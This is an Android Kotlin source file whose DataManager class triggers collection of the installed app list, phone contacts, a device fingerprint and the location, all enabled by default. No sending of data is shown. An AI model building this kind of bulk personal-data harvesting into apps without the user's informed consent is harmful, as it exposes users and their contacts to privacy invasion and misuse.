package com.qit.india

import android.content.Context
import com.qit.applist.AppListController
import com.qit.base.GrabController
import com.qit.base.GrabType.Companion.TYPE_APP_LIST
import com.qit.base.GrabType.Companion.TYPE_DEVICE_FINGER
import com.qit.base.GrabType.Companion.TYPE_PHONE_BOOK
import com.qit.base.GrabType.Companion.TYPE_UPLOCAD_LOCATION
import com.qit.contact.ContactController
import com.qit.device.DeviceController
import com.qit.location.LocationController


class DataManager(private val context: Context, private val listener: GrabController.GrabListener) {
    private fun <T : GrabController> getData(controller: T, type: Int) {
        controller.registerListener(type, listener)
    }

    fun getAllGrab(appListCondition: () -> Boolean = { true },
                   contactCondition: () -> Boolean = { true },
                   deviceCondition: () -> Boolean = { true },
                   locationCondition: () -> Boolean = { true }) {
        if (appListCondition()) getAppList()
        if (contactCondition()) getContact()
        if (deviceCondition()) getDevice()
        if (locationCondition()) getLocation()
    }

    private fun getAppList() {
        getData(AppListController(context), TYPE_APP_LIST)
    }

    private fun getContact() {
        getData(ContactController(context), TYPE_PHONE_BOOK)
    }

    private fun getDevice() {
        getData(DeviceController(context), TYPE_DEVICE_FINGER)
    }

    private fun getLocation() {
        getData(LocationController(context), TYPE_UPLOCAD_LOCATION)
    }
}